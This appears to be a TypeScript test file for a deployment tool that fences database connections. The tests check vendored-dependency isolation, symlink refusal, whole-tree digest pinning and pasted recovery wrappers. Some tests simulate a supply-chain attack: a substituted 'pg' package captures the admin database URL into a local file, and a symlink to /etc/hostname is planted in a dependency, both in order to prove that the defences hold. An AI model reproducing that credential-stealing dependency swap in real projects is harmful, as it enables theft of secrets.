    'exec 2>&1',
    ...pins,
    ...protectedLibraryLines(root),
    `DB_FENCE_SCRIPT=${JSON.stringify(checkoutHelper(root))}`,
    `DB_FENCE_STATE=${JSON.stringify(join(root, 'state.json'))}`,
    'chown(){ :; }',
    ...body,
  ].join('\n')
}

test('r32: a dependency substituted in the checkout is never the one the protected helper imports', () => {
  // THE LOAD-BEARING TEST FOR THE CRITICAL. Two real node processes, one artefact, one swap.
  //
  // MUTATION ROUTE (verified by making each change locally and re-running):
  //   1. put r31's hop back — replace the `_fence_vendor_into` call in _fence_stage_and_publish()
  //      with `ln -sfn "${app_dir}/node_modules" "${DB_FENCE_PROTECTED_APP_DIR}/node_modules"`.
  //      The published tree then resolves `pg` through the checkout, ${dir}/STOLEN appears holding
  //      the admin URL, and both the flavour and the STOLEN assertions fail.
  //   2. drop `--no-dereference` from the copy and point ${app}/node_modules/pg at a directory
  //      outside the checkout: the escape stops being refused and is copied in silently.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r32-swap-'))
  try {
    writeFenceCheckout(dir, importReportingHelper(dir))
    const stolen = join(dir, 'STOLEN')
    const flavour = join(dir, 'flavour.txt')

    const resolved = runShell(artefactHarness(dir, ['script="$(db_fence_script_in_use)" || exit 1', 'echo "SCRIPT=${script}"']))
    assert.equal(resolved.status, 0, `the artefact must publish:\n${resolved.output}`)
    const script = /^SCRIPT=(.+)$/m.exec(resolved.output)?.[1]
    assert.equal(script, protectedPaths(dir).helper, `and the resolved script is the protected one:\n${resolved.output}`)

    // THE SWAP. The account owns node_modules and does not need to delete anything — only to
    // supply something that works.
    writeFileSync(checkoutPgEntry(dir), STEALING_PG)

    const env = {
      ...process.env,
      DEPLOY_ADMIN_DATABASE_URL: 'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb',
      IMS_TEST_STOLEN_PATH: stolen,
    }
    const run = spawnSync('node', [script!], { encoding: 'utf8', env, cwd: dir })
    assert.equal(run.status, 0, `the protected helper must still run:\n${run.stdout}${run.stderr}`)
    assert.equal(readFileSync(flavour, 'utf8'), 'SHIPPED-PG', 'and it imported the VENDORED pg, not the checkout\'s')
    assert.ok(!existsSync(stolen), 'so nothing wrote the admin credential out')

    // THE CONTROL, and it is what makes the two assertions above mean something: the very same
    // substituted package, reached from the checkout's own copy of the helper, DOES run and DOES
    // steal. The swap was live; the artefact is what refused it.
    const control = spawnSync('node', [checkoutHelper(dir)], { encoding: 'utf8', env, cwd: dir })
    assert.equal(control.status, 0, `${control.stdout}${control.stderr}`)
    assert.equal(readFileSync(flavour, 'utf8'), 'SUBSTITUTED-PG', 'the substitution is real')
    assert.equal(
      readFileSync(stolen, 'utf8'),
      'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb',
      'and it captures the credential the deploy hands the helper',
    )

    // AND THE MIRROR HOLDS A REAL DIRECTORY, not a link back into the checkout. lstat, because
    // existsSync follows symlinks and would be satisfied by exactly the thing r31 shipped.
    const modules = join(protectedPaths(dir).app, 'node_modules')
    assert.ok(lstatSync(modules).isDirectory(), 'the mirror\'s node_modules must be a directory')
    assert.ok(!lstatSync(modules).isSymbolicLink(), 'and never a symlink')
    assert.ok(existsSync(protectedPaths(dir).pgEntry), 'with the package really copied into it')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('r32: no module resolution out of the protected artefact can reach the application directory', () => {
  // THE OTHER HALF OF THE SAME CLAIM, and it is a property of the PATH rather than of a check:
  // ${APP_DIR} is not an ancestor of /etc/ims-cutover-recovery/app, so no walk that starts inside
  // the mirror can arrive there. A specifier that was not vendored is ERR_MODULE_NOT_FOUND — a
  // fence that refuses — and never a package the application account chose.
  //
  // MUTATION ROUTE: symlink the mirror's node_modules at the checkout's (r31's shape) and the
  // second assertion fails: `late` resolves and the run exits 0.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r32-walk-'))
  try {
    // A helper that imports something OUTSIDE DB_FENCE_VENDOR_ROOTS, and a package of that name
    // sitting in the checkout where the r31 hop would have found it.
    writeFenceCheckout(dir, "import 'late-addition'\nprocess.stdout.write('LOADED\\n')\n")
    const late = join(dir, 'app', 'node_modules', 'late-addition')
    mkdirSync(late, { recursive: true })
    writeFileSync(join(late, 'package.json'), `${JSON.stringify({ name: 'late-addition', version: '0.0.0', main: 'index.js' })}\n`)
    writeFileSync(join(late, 'index.js'), "module.exports = {}\n")

    const resolved = runShell(artefactHarness(dir, ['script="$(db_fence_script_in_use)" || exit 1', 'echo "SCRIPT=${script}"']))
    assert.equal(resolved.status, 0, `the artefact must publish:\n${resolved.output}`)
    const script = /^SCRIPT=(.+)$/m.exec(resolved.output)![1]

    // FROM THE CHECKOUT it resolves, because the checkout is where the package is.
    const control = spawnSync('node', [checkoutHelper(dir)], { encoding: 'utf8', cwd: dir })
    assert.equal(control.status, 0, `precondition — the package really is resolvable in the checkout:\n${control.stderr}`)
    assert.match(control.stdout, /LOADED/, 'and the import really is reached')

    // FROM THE MIRROR it does not, and the failure is the interpreter's, not a guess.
    const run = spawnSync('node', [script], { encoding: 'utf8', cwd: dir })
    assert.notEqual(run.status, 0, `an unvendored import must not resolve from the mirror:\n${run.stdout}${run.stderr}`)
    assert.match(run.stderr, /ERR_MODULE_NOT_FOUND|Cannot find package/, run.stderr)
    assert.doesNotMatch(run.stdout, /LOADED/, 'and nothing out of the application directory was executed')

    // AND THE PATHS SAY SO. The mirror is not under the checkout, so the walk has nowhere to
    // arrive: it ends at the filesystem root.
    assert.ok(
      !protectedPaths(dir).app.startsWith(join(dir, 'app') + '/'),
      'the protected artefact must not live inside the application directory',
    )
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

/** The recipe the library computes with, and the one docs/installation.md prints. */
const ARTEFACT_RECIPE = (() => {
  const library = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  const line = /^readonly DB_FENCE_ARTEFACT_RECIPE="(.+)"$/m.exec(library)
  assert.ok(line, 'the library must state the digest recipe as one string')
  return line[1].replace(/\\\\/g, '\\')
})()

test('r32: the recorded digest covers the whole tree, and the documented command reproduces it', () => {
  // A DIGEST AN OPERATOR CANNOT REPRODUCE IS A CHECK THEY WILL CONCLUDE IS BROKEN AND STOP
  // RUNNING. So the recipe is one string in the library, the library hashes with exactly those
  // bytes, docs/installation.md prints exactly that string, and this runs it.
  //
  // MUTATION ROUTE (each verified locally):
  //   1. change `printf '%s\n' "$manifest" | sha256sum` in _fence_tree_digest() back to
  //      `printf '%s'` — one missing newline — and the reproduction assertion fails: the recorded
  //      value and the documented command's value differ, which is exactly the failure mode this
  //      test exists for, and nothing else in the suite notices.
  //   2. make the manifest hash only scripts/ and the "covers the vendored packages" assertion
  //      fails: touching a vendored file stops being detected.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r32-digest-'))
  try {
    writeFenceCheckout(dir, importReportingHelper(dir))
    const paths = protectedPaths(dir)
    assert.equal(runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null || exit 1'])).status, 0)

    const record = readFileSync(paths.artefactFile, 'utf8')
    const recorded = /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(record)?.[1]
    assert.ok(recorded, `the record must carry a tree digest:\n${record}`)

    // THE DOCUMENTED COMMAND, run verbatim in the published tree.
    const reproduced = execFileSync('bash', ['-c', ARTEFACT_RECIPE], { cwd: paths.app, encoding: 'utf8' }).split(' ')[0]
    assert.equal(reproduced, recorded, 'the documented command must reproduce the recorded digest')

    // AND THE RUNBOOK PRINTS THAT SAME STRING, so the operator is not reproducing a different one.
    const runbook = readFileSync(join(process.cwd(), 'docs/installation.md'), 'utf8')
    assert.ok(runbook.includes(ARTEFACT_RECIPE), `docs/installation.md must print the recipe verbatim:\n${ARTEFACT_RECIPE}`)

    // IT COVERS THE VENDORED PACKAGES. Change one byte of a dependency, leave the entry file
    // alone, and the resolution refuses — while the entry file's own digest is untouched, which
    // is precisely what r31's check would have looked at and passed.
    const entryBefore = execFileSync('sha256sum', [paths.helper], { encoding: 'utf8' }).split(' ')[0]
    writeFileSync(paths.pgEntry, `${readFileSync(paths.pgEntry, 'utf8')}// moved\n`)
    const entryAfter = execFileSync('sha256sum', [paths.helper], { encoding: 'utf8' }).split(' ')[0]
    assert.equal(entryAfter, entryBefore, 'precondition: the entry file did not move, only a dependency did')

    const after = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"']))
    assert.match(after.output, /^RC=1$/m, `a moved dependency must be refused:\n${after.output}`)
    assert.match(after.output, /is not the tree its record binds/, after.output)
    assert.match(after.output, /sha256sum -c/, 'and it must say how to find WHICH file moved')

    // The manifest it points at really does name it, so that instruction is not decoration.
    const check = spawnSync('sha256sum', ['-c', paths.manifestFile], { cwd: paths.app, encoding: 'utf8' })
    assert.notEqual(check.status, 0, 'the manifest check must fail')
    assert.match(`${check.stdout}${check.stderr}`, /node_modules\/pg\/lib\/index\.js: FAILED/, `${check.stdout}${check.stderr}`)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('r32: a symlink anywhere in the closure is refused rather than published', () => {
  // A symlink is FOLLOWED by node and is NOT HASHED by the manifest, so a tree containing one has
  // an executable surface its digest does not cover — this round's defect coming back in by the
  // door marked "convenience". Both shapes are refused: a link inside a vendored package, and a
  // package directory that is itself a link out of the checkout.
  //
  // MUTATION ROUTE: delete the `! -type d -a ! -type f` clause from _fence_tree_is_sealed() and
  // the first case publishes, with /etc/hostname's contents reachable from inside the artefact.
  // Delete the `relative.startsWith('..')` check in the closure program and the second publishes.
  const inside = mkdtempSync(join(tmpdir(), 'ims-r32-link-'))
  try {
    writeFenceCheckout(inside, importReportingHelper(inside))
    symlinkSync('/etc/hostname', join(inside, 'app', 'node_modules', 'pg', 'lib', 'sneaked.js'))
    const result = runShell(artefactHarness(inside, ['db_fence_script_in_use >/dev/null; echo "RC=$?"']))
    assert.match(result.output, /^RC=1$/m, `a symlink in the closure must stop the publication:\n${result.output}`)
    assert.match(result.output, /neither a regular file nor a directory/, result.output)
    assert.match(result.output, /sneaked\.js/, 'and it must name the offending path')
    assert.ok(!existsSync(protectedPaths(inside).helper), 'and nothing may be left standing to execute')
  } finally {
    rmSync(inside, { recursive: true, force: true })
  }

  const out = mkdtempSync(join(tmpdir(), 'ims-r32-escape-'))
  try {
    writeFenceCheckout(out, importReportingHelper(out))
    const real = join(out, 'elsewhere')
    renameSync(join(out, 'app', 'node_modules', 'pg'), real)
    symlinkSync(real, join(out, 'app', 'node_modules', 'pg'))
    const result = runShell(artefactHarness(out, ['db_fence_script_in_use >/dev/null; echo "RC=$?"']))
    assert.match(result.output, /^RC=1$/m, `a package that resolves outside the checkout must be refused:\n${result.output}`)
    assert.match(result.output, /which is outside/, result.output)
    assert.ok(!existsSync(protectedPaths(out).helper), 'and nothing may be published')
  } finally {
    rmSync(out, { recursive: true, force: true })
  }
})

test('r32: IMS_FENCE_ARTEFACT_SHA256 pins the whole tree, at publication and at every run', () => {
  // The entry-file pin authenticates a tenth of what executes. This one authenticates all of it,
  // and it is what an operator who has already published a release on one host uses to require
  // byte-identity on the next.
  //
  // MUTATION ROUTE: delete the DB_FENCE_EXPECTED_ARTEFACT_SHA256 comparison from
  // _fence_stage_and_publish() and case 1 publishes under a digest nobody authorised; delete it
  // from db_fence_script_in_use() and case 3 runs a tree this invocation did not pin.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r32-pin-'))
  try {
    writeFenceCheckout(dir, importReportingHelper(dir))
    const paths = protectedPaths(dir)

    // 1 — A WRONG PIN AT BOOTSTRAP PUBLISHES NOTHING AT ALL.
    const wrong = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${'a'.repeat(64)}`]))
    assert.match(wrong.output, /^RC=1$/m, `a mismatched pin must refuse:\n${wrong.output}`)
    assert.match(wrong.output, /IMS_FENCE_ARTEFACT_SHA256 expects/, wrong.output)
    assert.ok(!existsSync(paths.app), 'and leave nothing behind under the protected directory')

    // 2 — WITHOUT A PIN IT BOOTSTRAPS, and the digest it records is the one to pin with.
    assert.equal(runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null || exit 1'])).status, 0)
    const digest = /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(readFileSync(paths.artefactFile, 'utf8'))![1]

    // 3 — THE RIGHT PIN RUNS; A WRONG ONE REFUSES A TREE ALREADY STANDING.
    const pinned = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${digest}`]))
    assert.match(pinned.output, /^RC=0$/m, `the matching pin must be accepted:\n${pinned.output}`)
    // A mismatched pin against a standing artefact is refused at the ROTATION: the pin says
    // "publish this exact tree", the tree that can be assembled is not it, and nothing is written.
    const mismatched = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${'b'.repeat(64)}`]))
    assert.match(mismatched.output, /^RC=1$/m, `and a mismatched one must refuse:\n${mismatched.output}`)
    assert.match(mismatched.output, /IMS_FENCE_ARTEFACT_SHA256 expects b{64}/, mismatched.output)
    assert.match(mismatched.output, /NOTHING was published/, 'and say that nothing moved')
    assert.equal(
      /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(readFileSync(paths.artefactFile, 'utf8'))![1],
      digest,
      'the standing artefact is untouched by a refused rotation',
    )

    // 4 — AND WITH A FENCE STANDING, where rotation is refused outright, the pin is still checked
    // BEFORE the tree is executed. This is the path that would otherwise run a version the
    // invocation did not authenticate: the rotation says "not now", and without the second check
    // the run would carry on with whatever is there.
    writeFileSync(join(dir, 'state.json'), '{}\n')
    const standing = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${'c'.repeat(64)}`]))
    assert.match(standing.output, /a connection fence is recorded at/, `the rotation must be refused while a fence stands:\n${standing.output}`)
    assert.match(standing.output, /^RC=1$/m, 'and the run must not go on with an unauthenticated tree')
    assert.match(standing.output, /Refusing to run a tree this invocation did not authenticate/, standing.output)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// ---------------------------------------------------------------------------
// r32: THE OPERATOR-FACING TEXT (o3d-2sm1.5, Codex HIGH x2)
//
// Both findings were one defect: the code was fixed in r31 and every printed instruction still
// described the world before it. So each printed recovery instruction is now asked two questions,
// and both are asked here rather than by reading:
//
//   1. does it name a path that is still TRUSTED?   — the static half below
//   2. would it actually RUN if pasted?             — the dynamic half, which pastes it
//
// An emergency instruction that fails when typed is worse than none: it is followed at the one
// moment when there is no time to debug it, and the database stays fenced while it is debugged.
// ---------------------------------------------------------------------------

const ENTRYPOINT_SOURCES = [
  { name: 'deploy.sh', lines: DEPLOY_LINES },
  { name: 'update.sh', lines: UPDATE_LINES },
  { name: 'install.sh', lines: INSTALL_LINES },
] as const

/**
 * What the library will put in front of a printed root-only path, for a given PATH. Resolved the
 * same way the library resolves it — `command -v sudo` — rather than assumed, because a box
 * without sudo is one the reader can only have reached as root, and there the bare path IS the
 * runnable instruction. Tests that hard-coded either answer would pass on one host and fail on
 * the next.
 */
function sudoPrefixOn(path: string): string {
  const found = spawnSync('bash', ['-c', 'command -v sudo >/dev/null 2>&1'], { env: { PATH: path } as unknown as NodeJS.ProcessEnv })
  return found.status === 0 ? 'sudo ' : ''
}

/**
 * Link an EXPLICIT EXECUTABLE CLOSURE into `into`: for every command named, the first entry on
 * `pathValue` that supplies a runnable file of that name, linked by its absolute path.
 *
 * THE QUESTION A SHELL ASKS, ASKED THE SAME WAY. The construction this replaced enumerated every
 * PATH entry with `readdirSync` and linked whatever it listed, skipping directories it could not
 * read. A SEARCH-ONLY DIRECTORY — mode 0111, which is a normal and valid way to publish
 * executables — answers EACCES to `readdirSync` while everything inside it still runs, so
 * enumeration silently dropped a directory that the real PATH resolves out of and the fixture came
 * up short of a tool the test needs. Enumeration also cannot tell a name that resolves from one
 * that does not: a dangling symlink or a file with no execute bit is a name a listing reports and
 * a PATH search steps over, so the first-wins rule linked something unrunnable and shadowed the
 * working candidate behind it. `execvp` asks a different question — is <entry>/<name> executable —
 * and walks on when the answer is no. So does this.
 *
 * A command nothing supplies is a FIXTURE-BUILD FAILURE that names the command, not a surprise
 * `status: null` from a spawn several assertions later.
 */
function linkExecutableClosure(into: string, commands: readonly string[], pathValue: string): void {
  const entries = pathValue.split(':').filter((entry) => entry !== '')
  for (const command of commands) {
    let resolved: string | undefined
    for (const entry of entries) {
      const candidate = join(entry, command)
      try {
        accessSync(candidate, constants.X_OK)
        // A directory can carry the execute bit and answer X_OK; it is not what a PATH search runs.
        if (!statSync(candidate).isFile()) continue
      } catch {
        // Absent, dangling, or not executable by this account. Keep walking, exactly as execvp does.
        continue
      }
      resolved = candidate
      break
    }
    if (resolved === undefined) {
      throw new Error(`the PATH fixture requires \`${command}\`, and no entry on ${pathValue} supplies a runnable one`)
    }
    symlinkSync(resolved, join(into, command))
  }
}

/**
 * WHAT THE NO-SUDO WRAPPER PHASE RUNS, AND HOW THE LIST WAS ESTABLISHED — read out of the wrapper
 * body that `db_fence_publish_operator_wrappers()` writes (scripts/lib/db-fence-protected.sh, the
 * quoted `WRAPPER_EOF` heredoc), taking every word in command position that is not a bash builtin,
 * plus the one command the test itself spawns through this PATH:
 *
 *   bash                        `spawnSync('bash', …)` below and inside `sudoPrefixOn()`. The child
 *                               resolves it out of the PATH it is handed, which is this fixture.
 *   id                          `if [[ "$(id -u)" -ne 0 && "$(id -un)" != "${app_account}" ]]` —
 *                               the account gate, the wrapper's first line of work.
 *   find, sort, xargs,          `find . -type f -printf '%P\0' | LC_ALL=C sort -z |
 *   sha256sum                   xargs -0 -r sha256sum -- | sha256sum` — the whole-tree artefact
 *                               digest, checked before the wrapper prints anything at all.
 *   grep, tail                  the one-key `.env` reader. This phase moves the `.env` away so the
 *                               `[[ -f "${app_env_file}" ]]` branch is not taken, but it is one
 *                               rename away and a fixture that omitted them would be a trap.
 *
 * `env`, `runuser` and `node` are DELIBERATELY ABSENT: they are reached only by `run_helper` on the
 * wrapper's last line, which this phase never gets to — it exits 1 at the missing credential. A
 * name on this list that the box cannot supply aborts the fixture, so the list is kept to what this
 * phase can actually run rather than padded with what a different phase would.
 *
 * AND THE LIST IS PROVED SUFFICIENT RATHER THAN ASSERTED. If any of id/find/sort/xargs/sha256sum
 * were missing, the digest would come out empty and the wrapper would print
 * `REFUSING: … hashes to nothing` instead of the credential message — so the bare-form assertion
 * at the end of the phase is what establishes the closure is complete, and it says so when it is
 * not.
 */
const NO_SUDO_FIXTURE_COMMANDS = ['bash', 'id', 'find', 'sort', 'xargs', 'sha256sum', 'grep', 'tail'] as const

test('r32: no printed instruction in any entrypoint names the checkout as something to run', () => {
  // MUTATION ROUTE (verified locally): restore r31's banner line in deploy.sh —
  //   echo -e "${RED}    node ${DB_FENCE_SCRIPT} --fence --state-file=... ${RESET}" >&2
  // — and this fails, naming deploy.sh and the line. The same for update.sh's
  // `error "  node ${DB_FENCE_SCRIPT} --fence ..."` and install.sh's.
  //
  // NOT A PROXIMITY RULE. It is about the GRAMMAR of the printed text: an executable invocation
  // (`node <path>`) whose path is the checkout's. A line that merely mentions ${DB_FENCE_SCRIPT}
  // in prose — "Restore ${DB_FENCE_SCRIPT} (it ships with the app)" — is not an instruction to
  // execute it and is not caught, which is why the pattern requires the `node ` prefix.
  // `\$\{DB_FENCE_SCRIPT\}` exactly — NOT a prefix of it. A first draft wrote the closing brace
  // as optional and matched `${DB_FENCE_SCRIPT_COPY}`, which is the protected path and the whole
  // point, so the test failed on the three dry-run lines that describe the correct behaviour.
  const RUNNABLE =
    /\bnode\s+(?:"?\$(?:\{DB_FENCE_SCRIPT\}|DB_FENCE_SCRIPT\b)"?|"?\$\{APP_DIR(?:_REAL)?\}[^"\s]*fence-db-connections\.mjs"?|(?:\.\/)?scripts\/fence-db-connections\.mjs)/
  const offenders: string[] = []
  for (const { name, lines } of ENTRYPOINT_SOURCES) {
    for (const line of lines) {
      if (!isCode(line)) continue
      // Only lines that PRINT. An actual invocation is `node "$fence_script"` with the resolved
      // path and is not one of these.
      if (!/^\s*(echo|printf|warn|error|die|info|success|ok)\b/.test(line.trim())) continue
      if (RUNNABLE.test(line)) offenders.push(`${name}: ${line.trim()}`)
    }
  }
  assert.deepEqual(
    offenders,
    [],
    'a printed recovery instruction may not tell an operator to execute the application-owned checkout',
  )

  // AND THE PRECONDITION, so the empty list above is not an empty scan: the same pattern DOES
  // match the line r31 shipped, run through the same classifier.
  const r31Line = '          echo -e "${RED}    node ${DB_FENCE_SCRIPT} --fence --state-file=${DB_FENCE_STATE}${RESET}" >&2'
  assert.ok(isCode(r31Line) && RUNNABLE.test(r31Line), 'precondition: the pattern catches the line this replaced')

  // EVERY ENTRYPOINT POINTS AT THE WRAPPERS, and at nothing else — with the privilege transition
  // in front of them since r33, because a 0700 root-owned path is not an instruction for the
  // non-root shell the banner is usually read in.
  for (const { name, lines } of ENTRYPOINT_SOURCES) {
    const source = lines.join('\n')
    assert.match(source, /^DB_FENCE_RELEASE_CMD="\$\{DB_FENCE_SUDO_PREFIX\}\$\{DB_FENCE_RELEASE_WRAPPER\}"$/m, `${name} must name the release wrapper`)
    assert.match(source, /^DB_FENCE_REFENCE_CMD="\$\{DB_FENCE_SUDO_PREFIX\}\$\{DB_FENCE_REFENCE_WRAPPER\}"$/m, `${name} must name the re-fence wrapper`)
    // Nothing may reassign them to a command line again.
    const rebuilt = lines.filter(
      (line) => isCode(line) && /^\s*DB_FENCE_(RELEASE|REFENCE)_CMD=/.test(line) && !/WRAPPER\}"$/.test(line.trim()),
    )
    assert.deepEqual(rebuilt, [], `${name} must not recompose a recovery command out of a path and arguments`)
  }
})

test('r32: the recovery wrapper an operator is given runs, as pasted, with nothing else supplied', () => {
  // THE LOAD-BEARING TEST FOR BOTH HIGHs. The wrapper is executed as a real process, exactly as
  // an operator would paste it — no arguments, no environment — and what reaches the protected
  // helper is read back off the filesystem.
  //
  // MUTATION ROUTE (each verified locally):
  //   1. delete the ${APP_DIR}/.env fallback from the generated wrapper (this is r31's world,
  //      where the credential had nowhere to come from): PHASE 1 fails — the wrapper exits 1 with
  //      "DEPLOY_ADMIN_DATABASE_URL is not set" and the helper is never reached.
  //   2. point `helper=` at ${DB_FENCE_SCRIPT} instead of ${DB_FENCE_SCRIPT_COPY}: phase 1's
  //      "which file ran" assertion fails.
  //   3. drop the digest re-check from the wrapper: PHASE 3 fails, and a wrapper left behind
  //      after the artefact moved would hand the credential to the new tree.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r32-wrapper-'))
  try {
    const log = join(dir, 'invocation.json')
    writeFenceCheckout(
      dir,
      [
        "import { writeFileSync } from 'node:fs'",
        "import 'pg'",
        `writeFileSync(${JSON.stringify(log)}, JSON.stringify({`,
        '  ran: process.argv[1],',
        '  argv: process.argv.slice(2),',
        "  admin: process.env.DEPLOY_ADMIN_DATABASE_URL ?? '',",
        '}))',
        '',
      ].join('\n'),
    )
    // The credential where the deploy reads it from — quoted, with a trailing comment, which is
    // the shape env_file_value() exists for and the shape a naive `grep | cut` gets wrong.
    writeFileSync(join(dir, 'app', '.env'), 'DEPLOY_ADMIN_DATABASE_URL="postgresql://admin:pw@127.0.0.1:5432/imsdb"  # deploy admin\n')

    const paths = protectedPaths(dir)
    const publish = runShell(
      artefactHarness(dir, [
        'db_fence_script_in_use >/dev/null || exit 1',
        `db_fence_publish_operator_wrappers "$(id -un)" ${JSON.stringify(join(dir, 'app', '.env'))} ${JSON.stringify(join(dir, 'state.json'))} ${JSON.stringify(join(dir, 'cutover.lock'))} --app-host=db.internal --app-port=6432 --app-user=imsapp --app-database=imsdb || exit 1`,
      ]),
    )
    assert.equal(publish.status, 0, `the wrappers must be published:\n${publish.output}`)
    for (const wrapper of [paths.releaseWrapper, paths.refenceWrapper]) {
      assert.ok(existsSync(wrapper), `${wrapper} must exist`)
      assert.equal(spawnSync('bash', ['-n', wrapper], { encoding: 'utf8' }).status, 0, `${wrapper} must parse`)
    }

    // PHASE 1 — PASTED, WITH NOTHING SUPPLIED. This is the whole of Codex's second HIGH: r31's
    // printed command could not obtain the credential from anywhere.
    const bare = spawnSync(paths.releaseWrapper, [], { encoding: 'utf8', env: { PATH: process.env.PATH ?? '' } as unknown as NodeJS.ProcessEnv })
    assert.equal(bare.status, 0, `the wrapper must run with nothing supplied:\n${bare.stdout}${bare.stderr}`)
    const invocation = JSON.parse(readFileSync(log, 'utf8'))
    assert.equal(invocation.ran, paths.helper, 'and the file it ran is the PROTECTED one, not the checkout')
    assert.deepEqual(
      invocation.argv,
      // o3d-secops r23: and the uid the authority must belong to. Baked as `id -u` rather than a
      // literal 0, for the reason publish_durable_file() asks it — the property is "the privileged
      // account that owns this install", and asking is what lets this regression run unprivileged.
      ['--release', '--state-file=' + join(dir, 'state.json'), `--state-owner=${process.getuid?.() ?? 0}`, '--app-host=db.internal', '--app-port=6432', '--app-user=imsapp', '--app-database=imsdb'],
      'with this run\'s state file, the uid that publishes the authority, and the four identity values already filled in',
    )
    assert.equal(
      invocation.admin,
      'postgresql://admin:pw@127.0.0.1:5432/imsdb',
      'and the admin credential read out of the same .env the deploy reads',
    )

    // The re-fence wrapper is the same instruction in the other direction — Codex's third finding,
    // where the banner still named the checkout at the moment the schema had already moved.
    rmSync(log)
    const refence = spawnSync(paths.refenceWrapper, [], { encoding: 'utf8', env: { PATH: process.env.PATH ?? '' } as unknown as NodeJS.ProcessEnv })
    assert.equal(refence.status, 0, `${refence.stdout}${refence.stderr}`)
    assert.equal(JSON.parse(readFileSync(log, 'utf8')).argv[0], '--fence', 'the re-fence wrapper raises the fence')
    // AND IT LEAVES A RECORD THAT SAYS THE FENCE WENT UP (o3d-secops r25). The wrapper bakes the
    // applied stamp beside the validator and runs it after `--fence`, for the same reason
    // db_fence_raise() does: `fence_mode` is computed from that stamp and not from the pathname, so
    // a re-fence that raised a fence and did not stamp it would leave the NEXT cutover reading an
    // unapplied record and refusing. Asserted on the artefact and on the wrapper's own words —
    // delete either half of the wrapper's stamp and this fails.
    const raisedRecord = JSON.parse(readFileSync(join(dir, 'state.json'), 'utf8'))
    assert.equal(raisedRecord.fence_mode, 'initial', 'nothing was standing, so the wrapper published an initial authority')
    assert.equal(raisedRecord.fence_applied, 1,
      `and the fence it raised must be recorded as applied:\n${refence.stderr}`)
    assert.match(refence.stderr, /is stamped APPLIED/, `announced by the stamp itself:\n${refence.stderr}`)

    // PHASE 1b — A PUBLICATION THAT FAILS AFTER ITS RENAME (o3d-secops r25, Codex HIGH). The
    // validator's last barrier is the directory fsync, and it runs AFTER the atomic rename: when it
    // fails it says so and leaves the record visible. o3d-secops r24 hung the wrapper's cleanup off
    // the EXECUTION's exit 3, and this route never reaches an execution, so the record survived for
    // the next cutover to find. The wrapper now removes its own half-published record here too.
    //
    // ROUTE, AND IT IS THE REAL ONE: the authority's directory is made mode 0300 — searchable and
    // writable, so `stat`, the temporary, the rename and the `rm -f` all work, and not readable, so
    // `open(directory, 'r')` for the fsync returns EACCES. Root has no such denial, hence the skip.
    if ((process.getuid?.() ?? 0) !== 0) {
      const tornPublication = () => {
        rmSync(log, { force: true })
        chmodSync(dir, 0o300)
        const run = spawnSync(paths.refenceWrapper, [], { encoding: 'utf8', env: { PATH: process.env.PATH ?? '' } as unknown as NodeJS.ProcessEnv })
        chmodSync(dir, 0o700)
        assert.match(run.stderr, /NAME is not durable/,
          `precondition: the publication must fail at the post-rename barrier:\n${run.stdout}${run.stderr}`)
        assert.equal(run.status, 1, `and the re-fence must refuse:\n${run.stdout}${run.stderr}`)
        assert.ok(!existsSync(log), 'and must never reach the helper with an authority it could not publish')
        return run
      }

      // FIRST, THE HALF THAT MUST NOT FIRE. The fence raised above is still standing and its record
      // is still there, so the record this refusal is looking at is NOT this run's own — it is the
      // only account of what the earlier run revoked, and every grantee it names depends on it.
      const overStanding = tornPublication()
      assert.equal(existsSync(join(dir, 'state.json')), true,
        `a standing fence's record is never removed by a refusal:\n${overStanding.stdout}${overStanding.stderr}`)

      // AND THEN THE ONE THAT MUST. With nothing at the path when the wrapper starts, the record a
      // failed publication leaves is this run's own and describes a fence that does not exist.
      rmSync(join(dir, 'state.json'))
      const torn = tornPublication()
      assert.equal(existsSync(join(dir, 'state.json')), false,
        `and must not leave its half-published record at the authoritative path:\n${torn.stdout}${torn.stderr}`)
      // The invocation log is what the phases below remove and then assert the absence of; this
      // phase consumed it proving the helper was never reached, so it is put back.
      writeFileSync(log, '{}')
    }

    // PHASE 2 — NO CREDENTIAL ANYWHERE. It refuses, names the variable, and prints its OWN path
    // in the command that would supply it, so the next paste works too.
    rmSync(log)
    renameSync(join(dir, 'app', '.env'), join(dir, 'app', '.env.away'))
    const noCredential = spawnSync(paths.releaseWrapper, [], { encoding: 'utf8', env: { PATH: process.env.PATH ?? '' } as unknown as NodeJS.ProcessEnv })
    assert.equal(noCredential.status, 1, 'a wrapper with no credential must refuse')
    assert.ok(!existsSync(log), 'and must not reach the helper at all')
    assert.match(noCredential.stderr, /DEPLOY_ADMIN_DATABASE_URL is not set/, noCredential.stderr)
    assert.match(
      noCredential.stderr,
      new RegExp(`${sudoPrefixOn(process.env.PATH ?? '')}env DEPLOY_ADMIN_DATABASE_URL='postgresql://ADMIN:PASSWORD@HOST:PORT/DATABASE' ${paths.releaseWrapper}`),
      `and the command it suggests must name itself, absolutely, with the privilege the reader needs:\n${noCredential.stderr}`,
    )
    // …and that suggestion works, which is the difference between an instruction and a decoration.
    const supplied = spawnSync(paths.releaseWrapper, [], {
